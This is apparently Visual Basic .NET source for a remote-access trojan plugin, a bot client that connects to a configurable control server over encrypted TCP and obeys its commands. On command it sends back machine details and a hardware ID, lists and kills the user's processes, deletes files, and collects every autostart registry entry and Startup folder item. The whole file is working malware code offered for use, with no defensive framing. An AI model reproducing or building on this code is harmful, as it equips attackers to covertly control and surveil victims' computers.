Imports System.Net.Sockets
Imports System.Security.Cryptography
Imports Microsoft.Win32

Public Class Main

    Public Shared C As TcpClient = Nothing
    Public Shared ENDOF As String
    Public Shared HOST As String
    Public Shared PORT As Integer
    Public Shared SPL As String
    Public Shared PASS As String
    Public Shared M As New IO.MemoryStream
    Public Shared FULLPATH As String
    Public Shared HWID As String
    Public Shared BOT As String
    Public Shared Pastebin As String

    Public Shared Sub CN(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String, ByVal HW As String, ByVal BT As String, ByVal PB As String)

        ENDOF = K
        HOST = H
        PORT = P
        SPL = SP
        PASS = PW
        FULLPATH = FP
        HWID = HW
        BOT = BT
        Pastebin = PB

        Dim lp As Integer = 0

        Alive = False
        Try
            C.Client.Disconnect(False)
        Catch ex As Exception
        End Try
        Try
            M.Dispose()
        Catch ex As Exception
        End Try
        M = New IO.MemoryStream
        Try
            C = New Net.Sockets.TcpClient
            C.ReceiveTimeout = -1
            C.SendTimeout = -1
            C.SendBufferSize = 999999
            C.ReceiveBufferSize = 999999
            C.Client.SendBufferSize = 999999
            C.Client.ReceiveBufferSize = 999999
            lp = 0
            C.Client.Connect(H, P)
            Alive = True
            Send("SysInfo" + SPL + ID.Getsystem + SPL + HWID)
        Catch ex As Exception
        End Try
        GoTo re
re:
        Try
            If C Is Nothing Then GoTo cc
            If C.Client.Connected = False Then GoTo cc
            If Alive = False Then GoTo cc
            lp += 1
            If lp > 500 Then
                lp = 0
                ' check if i am still connected
                If C.Client.Poll(-1, Net.Sockets.SelectMode.SelectRead) And C.Client.Available <= 0 Then GoTo cc
            End If
            If C.Available > 0 Then
                Dim B(C.Available - 1) As Byte
                C.Client.Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                M.Write(B, 0, B.Length)
rr:
                If BS(M.ToArray).Contains(K) Then ' split packet..
                    Dim A As Array = SplitByWord(M.ToArray, K)
                    Dim T As New Threading.Thread(AddressOf Data)
                    T.Start(A(0))
                    M.Dispose()
                    M = New IO.MemoryStream
                    If A.Length = 2 Then
                        M.Write(A(1), 0, A(1).length)
                        GoTo rr
                    End If
                End If
            End If
        Catch ex As Exception
            GoTo cc
        End Try
        Threading.Thread.CurrentThread.Sleep(1)
        GoTo re
cc:
        CloseMe()
    End Sub

    Public Shared Sub CloseMe()
        Threading.Thread.Sleep(1)
        Try
            C.Client.Close()
        Catch ex As Exception
        End Try
        Try
            C.Close()
        Catch ex2 As Exception
        End Try
        C = Nothing
        Try
            M.Dispose()
        Catch ex3 As Exception
        End Try
    End Sub

    Public Shared Sub Data(ByVal b As Byte())
        On Error Resume Next
        Dim A As String() = Split(AES_Decrypt(BS(b)), SPL)


        Select Case A(0)
                Case "Sysinfo"
                    Send("SysInfo" + SPL + ID.Getsystem + SPL + HWID)

                Case "PROC"
                Dim L As String = ""
                Dim searcher As New Management.ManagementObjectSearcher("Select * from Win32_Process")
                Dim processList As Management.ManagementObjectCollection = searcher.Get()
                For Each obj As Management.ManagementObject In processList
                    Dim owner = {""}
                    Dim returnVal = Convert.ToInt32(obj.InvokeMethod("GetOwner", owner))
                    If returnVal = 0 Then
                        If owner(0) = Environment.UserName Then
                            L += obj.Item("Name") & "|'P'|" & obj.Item("ProcessId") & "|'P'|" & obj.Item("ExecutablePath") & "|'P'|" ' file |'p'| 1 |'p'| c:/file.exe |'p'|
                        End If
                    End If
                Next
                Send("PROC" + SPL + L + SPL + Windows.Forms.Application.ExecutablePath + SPL + HWID)

                Case "PROCKILL"
                Dim PR As Process
                PR = Process.GetProcessById(A(1).ToString)
                PR.Kill()

            Case "PROCDEL"
                Dim PR As Process
                PR = Process.GetProcessById(A(1).ToString)
                PR.Kill()
                Threading.Thread.Sleep(2000)
                IO.File.Delete(A(2))

            Case "STUP" 'credit ĦΔĆҜƗŇǤ ŞØØƒ

                    'HKEY_CURRENT_USER_Run
                    Dim MyKey1 As String = "Software\Microsoft\Windows\CurrentVersion\Run\"
                    Dim HKEY_CURRENT_USER_Run As String = String.Empty
                    If Registry.CurrentUser.OpenSubKey(MyKey1) IsNot Nothing Then
                        For Each Value In Registry.CurrentUser.OpenSubKey(MyKey1).GetValueNames
                            If Registry.CurrentUser.OpenSubKey(MyKey1).GetValueKind(Value) = RegistryValueKind.Binary Then
                                HKEY_CURRENT_USER_Run += Value + "|'P'|" + Text.Encoding.Default.GetString(CType(Registry.CurrentUser.OpenSubKey(MyKey1).GetValue(Value), Byte())) + "|'P'|"
                            ElseIf Registry.CurrentUser.OpenSubKey(MyKey1).GetValueKind(Value) = RegistryValueKind.MultiString Then
                                For Each X In Registry.CurrentUser.OpenSubKey(MyKey1).GetValue(Value)
                                    HKEY_CURRENT_USER_Run += X & "," + "|'P'|"
                                Next
                            Else
                                HKEY_CURRENT_USER_Run += Value + "|'P'|" + Registry.CurrentUser.OpenSubKey(MyKey1).GetValue(Value) + "|'P'|"
                            End If
                        Next
                    End If

                    'HKEY_CURRENT_USER - RunOnce
                    Dim MyKey2 As String = "Software\Microsoft\Windows\CurrentVersion\RunOnce\"
                    Dim HKEY_CURRENT_USER_RunOnce As String = String.Empty
                    If Registry.CurrentUser.OpenSubKey(MyKey2) IsNot Nothing Then
                        For Each Value In Registry.CurrentUser.OpenSubKey(MyKey2).GetValueNames
                            If Registry.CurrentUser.OpenSubKey(MyKey2).GetValueKind(Value) = RegistryValueKind.Binary Then
                                HKEY_CURRENT_USER_RunOnce += Value + "|'P'|" + Text.Encoding.Default.GetString(CType(Registry.CurrentUser.OpenSubKey(MyKey2).GetValue(Value), Byte())) + "|'P'|"
                            ElseIf Registry.CurrentUser.OpenSubKey(MyKey2).GetValueKind(Value) = RegistryValueKind.MultiString Then
                                For Each X In Registry.CurrentUser.OpenSubKey(MyKey2).GetValue(Value)
                                    HKEY_CURRENT_USER_RunOnce += X & "," + "|'P'|"
                                Next
                            Else
                                HKEY_CURRENT_USER_RunOnce += Value + "|'P'|" + Registry.CurrentUser.OpenSubKey(MyKey2).GetValue(Value) + "|'P'|"
                            End If
                        Next
                    End If

                    'HKEY_CURRENT_USER - Policies\Explorer\Run\
                    Dim MyKey3 = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"
                    Dim HKEY_CURRENT_USER_Policies As String = String.Empty
                    If Registry.CurrentUser.OpenSubKey(MyKey3) IsNot Nothing Then
                        For Each Value In Registry.CurrentUser.OpenSubKey(MyKey3).GetValueNames
                            If Registry.CurrentUser.OpenSubKey(MyKey3).GetValueKind(Value) = RegistryValueKind.Binary Then
                                HKEY_CURRENT_USER_Policies += Value + "|'P'|" + Text.Encoding.Default.GetString(CType(Registry.CurrentUser.OpenSubKey(MyKey3).GetValue(Value), Byte())) + "|'P'|"
                            ElseIf Registry.CurrentUser.OpenSubKey(MyKey3).GetValueKind(Value) = RegistryValueKind.MultiString Then
                                For Each X In Registry.CurrentUser.OpenSubKey(MyKey3).GetValue(Value)
                                    HKEY_CURRENT_USER_Policies += X & "," + "|'P'|"
                                Next
                            Else
                                HKEY_CURRENT_USER_Policies += Value + "|'P'|" + Registry.CurrentUser.OpenSubKey(MyKey3).GetValue(Value) + "|'P'|"
                            End If
                        Next
                    End If

                    'LOCAL_MACHINE - Run
                    Dim MyKey4 = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"
                    Dim LOCAL_MACHINE_Run As String = String.Empty

                    If Registry.LocalMachine.OpenSubKey(MyKey4) IsNot Nothing Then
                        For Each Value In Registry.LocalMachine.OpenSubKey(MyKey4).GetValueNames
                            If Registry.LocalMachine.OpenSubKey(MyKey4).GetValueKind(Value) = RegistryValueKind.Binary Then
                                LOCAL_MACHINE_Run += Value + "|'P'|" + Text.Encoding.Default.GetString(CType(Registry.LocalMachine.OpenSubKey(MyKey4).GetValue(Value), Byte())) + "|'P'|"
                            ElseIf Registry.LocalMachine.OpenSubKey(MyKey4).GetValueKind(Value) = RegistryValueKind.MultiString Then
                                For Each X In Registry.LocalMachine.OpenSubKey(MyKey4).GetValue(Value)
                                    LOCAL_MACHINE_Run += X & "," + "|'P'|"
                                Next
                            Else
                                LOCAL_MACHINE_Run += Value + "|'P'|" + Registry.LocalMachine.OpenSubKey(MyKey4).GetValue(Value) + "|'P'|"
                            End If
                        Next
                    End If

                    'LOCAL_MACHINE - WOW6432Node
                    Dim MyKey7 = "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
                    Dim LOCAL_MACHINE_WOW6432Node As String = String.Empty

                    If Registry.LocalMachine.OpenSubKey(MyKey7) IsNot Nothing Then
                        For Each Value In Registry.LocalMachine.OpenSubKey(MyKey7).GetValueNames
                            If Registry.LocalMachine.OpenSubKey(MyKey7).GetValueKind(Value) = RegistryValueKind.Binary Then
                                LOCAL_MACHINE_WOW6432Node += Value + "|'P'|" + Text.Encoding.Default.GetString(CType(Registry.LocalMachine.OpenSubKey(MyKey7).GetValue(Value), Byte())) + "|'P'|"
                            ElseIf Registry.LocalMachine.OpenSubKey(MyKey7).GetValueKind(Value) = RegistryValueKind.MultiString Then
                                For Each X In Registry.LocalMachine.OpenSubKey(MyKey7).GetValue(Value)
                                    LOCAL_MACHINE_WOW6432Node += X & "," + "|'P'|"
                                Next
                            Else
                                LOCAL_MACHINE_WOW6432Node += Value + "|'P'|" + Registry.LocalMachine.OpenSubKey(MyKey7).GetValue(Value) + "|'P'|"
                            End If
                        Next
                    End If

                    'LOCAL_MACHINE - Policies\Explorer\
                    Dim MyKey5 = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"
                    Dim LOCAL_MACHINE_Policies As String = String.Empty
                    If Registry.LocalMachine.OpenSubKey(MyKey5) IsNot Nothing Then
                        For Each Value In Registry.LocalMachine.OpenSubKey(MyKey5).GetValueNames
                            If Registry.LocalMachine.OpenSubKey(MyKey5).GetValueKind(Value) = RegistryValueKind.Binary Then
                                LOCAL_MACHINE_Policies += Value + "|'P'|" + Text.Encoding.Default.GetString(CType(Registry.LocalMachine.OpenSubKey(MyKey5).GetValue(Value), Byte())) + "|'P'|"
                            ElseIf Registry.LocalMachine.OpenSubKey(MyKey5).GetValueKind(Value) = RegistryValueKind.MultiString Then
                                For Each X In Registry.LocalMachine.OpenSubKey(MyKey5).GetValue(Value)
                                    LOCAL_MACHINE_Policies += X & "," + "|'P'|"
                                Next
                            Else
                                LOCAL_MACHINE_Policies += Value + "|'P'|" + Registry.LocalMachine.OpenSubKey(MyKey5).GetValue(Value) + "|'P'|"
                            End If
                        Next
                    End If

                    'LOCAL_MACHINE - RunOnce
                    Dim MyKey6 = "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\"
                    Dim LOCAL_MACHINE_RunOnce As String = String.Empty
                    If Registry.LocalMachine.OpenSubKey(MyKey6) IsNot Nothing Then
                        For Each Value In Registry.LocalMachine.OpenSubKey(MyKey6).GetValueNames
                            If Registry.LocalMachine.OpenSubKey(MyKey6).GetValueKind(Value) = RegistryValueKind.Binary Then
                                LOCAL_MACHINE_RunOnce += Value + "|'P'|" + Text.Encoding.Default.GetString(CType(Registry.LocalMachine.OpenSubKey(MyKey6).GetValue(Value), Byte())) + "|'P'|"
                            ElseIf Registry.LocalMachine.OpenSubKey(MyKey6).GetValueKind(Value) = RegistryValueKind.MultiString Then
                                For Each X In Registry.LocalMachine.OpenSubKey(MyKey6).GetValue(Value)
                                    LOCAL_MACHINE_RunOnce += X & "," + "|'P'|"
                                Next
                            Else
                                LOCAL_MACHINE_RunOnce += Value + "|'P'|" + Registry.LocalMachine.OpenSubKey(MyKey6).GetValue(Value) + "|'P'|"
                            End If
                        Next
                    End If

                    'STARTUP folder
                    Dim STARTUP As String = String.Empty
                    For Each F As String In IO.Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Startup))
                        STARTUP += IO.Path.GetFileName(F) + "|'P'|" + F + "|'P'|"
                    Next

                    Send("STUP" + SPL + HKEY_CURRENT_USER_Run + SPL + HKEY_CURRENT_USER_RunOnce + SPL + HKEY_CURRENT_USER_Policies + SPL + LOCAL_MACHINE_Run + SPL + LOCAL_MACHINE_Policies + SPL + LOCAL_MACHINE_RunOnce + SPL + STARTUP + SPL + LOCAL_MACHINE_WOW6432Node + SPL + HWID)


                Case "Close"
                    CloseMe()
            End Select

    End Sub

    Public Shared Function SplitByWord(ByVal b As Byte(), ByVal WORD As String) As Array
        Dim a As New List(Of Byte())
        Dim M As New IO.MemoryStream
        Dim MM As New IO.MemoryStream
        Dim T As String() = Split(BS(b), WORD)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + WORD.Length, b.Length - (T(0).Length + WORD.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function

    Public Shared Sub Send(ByVal b As Byte())
        If Alive = False Then Exit Sub
        Try
            Dim r As Object = New IO.MemoryStream
            r.Write(b, 0, b.Length)
            r.Write(SB(ENDOF), 0, ENDOF.Length)
            C.Client.Send(r.ToArray, 0, r.Length, Net.Sockets.SocketFlags.None)
            r.Dispose()
        Catch ex As Exception
            Alive = False
        End Try
    End Sub

    Public Shared Sub Send(ByVal S As String)
        Send(SB(AES_Encrypt(S)))
    End Sub

    Public Shared Alive As Boolean = False

    Public Shared Function SB(ByVal s As String) As Byte()
        Return Text.Encoding.UTF8.GetBytes(s)
    End Function

    Public Shared Function BS(ByVal b As Byte()) As String
        Return Text.Encoding.UTF8.GetString(b)
    End Function

    Public Shared Function AES_Encrypt(ByVal input As String)
        Dim AES As New RijndaelManaged
        Dim Hash_AES As New MD5CryptoServiceProvider
        Dim encrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(SB(PASS))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = CipherMode.ECB
            Dim DESEncrypter As ICryptoTransform = AES.CreateEncryptor
            Dim Buffer As Byte() = SB(input)
            encrypted = Convert.ToBase64String(DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return encrypted
        Catch ex As Exception
        End Try
    End Function

    Public Shared Function AES_Decrypt(ByVal input As String)
        Dim AES As New RijndaelManaged
        Dim Hash_AES As New MD5CryptoServiceProvider
        Dim decrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(SB(PASS))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = CipherMode.ECB
            Dim DESDecrypter As ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = Convert.FromBase64String(input)
            decrypted = BS(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return decrypted
        Catch ex As Exception
        End Try
    End Function



End Class
